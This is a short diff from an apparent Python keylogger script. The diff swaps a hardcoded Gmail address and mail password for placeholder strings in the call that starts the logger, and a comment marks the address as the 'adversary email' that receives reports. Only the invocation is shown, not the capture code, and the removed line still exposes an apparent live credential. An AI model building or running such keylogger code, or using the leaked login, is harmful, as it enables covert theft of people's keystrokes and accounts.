@@ -39,6 +39,6 @@ class Keylogger:
             self.report()
             key_listen.join()
 
-my_key = Keylogger(20, "root.kali2000@gmail.com", "unhuman0174")
+my_key = Keylogger(20, "email", "password")
 # seconds interval,adversary email,mail password
 my_key.start()
